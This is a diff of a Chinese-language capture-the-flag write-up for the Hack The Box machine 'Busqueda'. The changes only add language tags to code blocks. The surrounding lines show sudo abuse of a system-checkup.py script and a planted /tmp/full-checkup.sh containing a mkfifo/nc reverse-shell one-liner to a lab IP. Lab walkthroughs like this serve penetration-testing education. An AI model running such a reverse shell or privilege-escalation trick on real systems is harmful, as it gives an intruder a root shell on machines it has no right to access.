@@ -121,7 +121,7 @@ f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   16 months ago   U
 ```
 
 參考[docker inspect](https://docs.docker.com/reference/cli/docker/inspect/)
-```
+```json
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect json gitea | jq
 
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq                           sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
@@ -338,7 +338,7 @@ svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 前往`http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py`
 
 執行`sudo /usr/bin/python3 /opt/scripts/system-checkup.py`後面會接一個`full-checkup.sh`
-```
+```bash
 ...
 elif action == 'full-checkup':
         try:
@@ -352,7 +352,7 @@ elif action == 'full-checkup':
 ```
 
 建立一個bash檔，到`/tmp`執行
-```
+```bash
 ## full-checkup.sh
 echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 9001 >/tmp/f" > /tmp/full-checkup.sh
 
